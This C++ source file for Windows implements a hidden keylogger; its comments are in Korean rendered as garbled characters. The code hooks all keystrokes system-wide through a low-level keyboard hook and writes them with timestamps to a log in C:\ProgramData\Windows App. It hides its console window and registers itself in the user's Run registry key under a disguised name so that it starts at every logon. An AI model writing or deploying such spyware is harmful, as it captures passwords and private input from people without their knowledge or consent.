#define _CRT_SECURE_NO_WARNINGS 
#include <bits/stdc++.h>
#include <Windows.h>
#include <WinUser.h>
#include <signal.h>
#include <shlobj.h>
#include <iostream>
#include <unordered_map>

int prevKey = -1;
HHOOK keyboardHook;
FILE* logFile;
time_t prevTime = time(NULL); // ������ Ű�� ���� �ð��� ������ ����
bool first = false;

//VKCode�� �ش��ϴ� Ű �̸��� ��ȯ�ϴ� �Լ�
char* GetKeyNameFromVKCode(int vkCode) {
    static char keyName[256];
    int scanCode = MapVirtualKey(vkCode, MAPVK_VK_TO_VSC);
    int result = GetKeyNameTextA(scanCode << 16, keyName, sizeof(keyName));

    //Ű �����ش��ϴ� ���ڿ��� ��ã�������
    if (result == 0)
        strcpy(keyName, "UNKNOWN");

    //Ű ���� �ش��ϴ� ���ڿ��� ���� �빮�ڷ� ��ȯ
    for (int i = 0; keyName[i] != '\0'; i++)
        keyName[i] = toupper(keyName[i]);

    //ã�� ���ڿ��� ��ȯ
    return keyName;
}

//log.txt�� ����ϴ� �Լ�
void WriteToLogFile(const char* message) {
    fprintf(logFile, "%s", message);
    fflush(logFile);
}

//Ű���� ��ŷ �Լ�
LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    const double interval = 1.5; //Ű �Է°� ������ 1.5�ʷ� ����

    if (nCode == HC_ACTION) {
        KBDLLHOOKSTRUCT* p = (KBDLLHOOKSTRUCT*)lParam;
        int vkCode = p->vkCode;

        if (wParam == WM_KEYDOWN) {
            if (prevKey != vkCode) {
                //Ű�� ���� �ð��� ���� �ð��� ���̸� ���
                time_t currentTime = time(NULL);
                double diff = difftime(currentTime, prevTime);

                //�ð����� ���ϱ�
                char timeString[128];
                struct tm* localTime;
                time(&currentTime);
                localTime = localtime(&currentTime);
                strftime(timeString, sizeof(timeString), "[%Y-%m-%d %H:%M:%S] ", localTime);

                //����Ű�� ���� �� �ִ� ���ڷ� ġȯ
                char keyName[32];
                strcpy(keyName, GetKeyNameFromVKCode(vkCode));

                //log.txt�� ������ ���ڿ�
                char logMessage[128];
                if (first) { //ó�� ����� �����Ҷ� �ð������� �Է�Ű ���
                    first = !first;
                    sprintf(logMessage, "%s%s", timeString, keyName);
                }
                else if (diff <= interval) { //Ű �Է� ������ 1.5�� ���ϸ�
                    //�Է�Ű�� ���
                    sprintf(logMessage, "%s", keyName);
                }
                else { //Ű �Է� ������ 1.5�� �ʰ��ϸ�
                    //������ log.txt�� ������� �ٹٲ��ϸ鼭 ���ο� �ٿ� �ð������� �Է�Ű ���
                    sprintf(logMessage, "\n%s%s", timeString, keyName);
                }

                //���� log.txt�� ����ϴ� ���
                WriteToLogFile(logMessage);

                // ���� �ð��� ������ Ű�� ���� �ð����� ����
                prevTime = currentTime;
            }
            //���� �Է�Ű�� ����
            prevKey = vkCode;
        }
        else if (wParam == WM_KEYUP) {
            //Ű�� ���� ���� �Է�Ű�� �ʱ�ȭ�Ͽ� ����Ű�� ������ ������ ���
            prevKey = -1;
        }
    }

    return CallNextHookEx(NULL, nCode, wParam, lParam);
}



//���α׷� ���� �ñ׳� �ڵ鷯
void SignalHandler(int signal) {
    fclose(logFile);
    exit(0);
}

//���α׷� ���� �� �׵����� �α׸� ����ϴ� �Լ�
void WriteRemainingLog() {
    fflush(logFile);
}

//���α׷� ������
int main() {
    //�������α׷� ������Ʈ���� ���
    const char* path = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run";

    //�������α׷� ������Ʈ�� �׸� �̸�
    const char* name = "hoons";

    //���α׷� ���� ���
    const char* executablePath = "C:\\ProgramData\\Windows App\\hoons.exe";

    //������Ʈ�� Ű ����
    HKEY hKey;
    LONG createStatus = RegCreateKeyExA(HKEY_CURRENT_USER, path, 0, nullptr, REG_OPTION_VOLATILE, KEY_WRITE, nullptr, &hKey, nullptr);
    if (createStatus != ERROR_SUCCESS) {
       //������Ʈ�� Ű ������ �����Ѱ��
    }

    //������Ʈ�� �׸� �� ����
    LONG setValueStatus = RegSetValueExA(hKey, name, 0, REG_SZ, (const BYTE*)executablePath, strlen(executablePath) + 1);
    if (setValueStatus != ERROR_SUCCESS) {
        //������Ʈ���� ������ �����Ѱ��
    }

    // ������Ʈ�� Ű �ݱ�
    RegCloseKey(hKey);

    
    //���α׷��� ����� ��, ��� ������Ʈ â�� ���� �ʵ��� ����
    HWND hwnd = GetConsoleWindow();
    ShowWindow(hwnd, SW_HIDE);

    logFile = fopen("C:\\ProgramData\\Windows App\\log.txt", "a");
    if (logFile == NULL) {
        logFile = fopen("C:\\ProgramData\\Windows App\\log.txt", "w");
        if (logFile == NULL) {
            printf("Failed to create log file.\n");
            return 1;
        }
    }


    //���α׷� ���� �ñ׳� �ڵ鷯 ���
    signal(SIGINT, SignalHandler);

    //���α׷� ���� �� �׵����� �α׸� ����ϵ��� atexit �Լ� ���
    atexit(WriteRemainingLog);

    keyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, NULL, 0);
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0) > 0);
    UnhookWindowsHookEx(keyboardHook);

    fclose(logFile);
    return 0;
}